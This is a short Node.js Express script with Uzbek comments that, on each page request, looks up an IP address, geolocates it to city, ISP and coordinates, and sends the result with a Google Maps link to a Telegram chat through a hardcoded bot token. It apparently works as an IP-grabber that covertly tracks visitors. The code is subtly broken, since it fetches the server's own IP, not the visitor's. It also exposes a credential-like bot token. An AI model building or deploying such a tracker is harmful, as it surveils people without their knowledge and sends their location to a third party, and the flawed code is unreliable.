const express = require('express');
const fetch = require('node-fetch');
const app = express();

// Telegram bot token va chat ID
const telegramToken = '7591835594:AAGafTZbs6U_vWadufkThR5gAcscaoUKFwQ';  // Bot tokenini kiriting
const chatId = '1271713912';  // Siz yuborishni xohlagan chat ID yoki botning username (masalan: '@username')

// IP manzilini olish
app.get('/', async (req, res) => {
    try {
        // ipify.org API orqali IP manzilini olish
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;  // IP manzili
        console.log(`Foydalanuvchining IP manzili: ${ip}`);

        // IP manziliga asoslangan qo'shimcha ma'lumotlarni olish
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const geoData = await geoResponse.json();
        const { city, regionName, country, isp, lat, lon } = geoData;

        // Natijani foydalanuvchiga yuborish
        const message = `
            IP Manzil: ${ip}
            Shahar: ${city}
            Mintaqa: ${regionName}
            Mamlakat: ${country}
            ISP: ${isp}
            Kenglik: ${lat}
            Uzunlik: ${lon}
            Google Maps Link: https://www.google.com/maps?q=${lat},${lon}
        `;

        // Telegramga yuborish
        await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
            method: 'POST',
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            }),
            headers: { 'Content-Type': 'application/json' }
        });

        // Foydalanuvchiga javob qaytarish
        res.json({
            message: 'Raxmat!'
        });
    } catch (error) {
        console.error('Xato:', error);
        res.status(500).json({ message: 'Ma‘lumot olishda xato yuz berdi' });
    }
});

// Serverni ishga tushirish
const port = 8080;
app.listen(port, () => {
    console.log(`Server http://localhost:${port} da ishlamoqda...`);
});
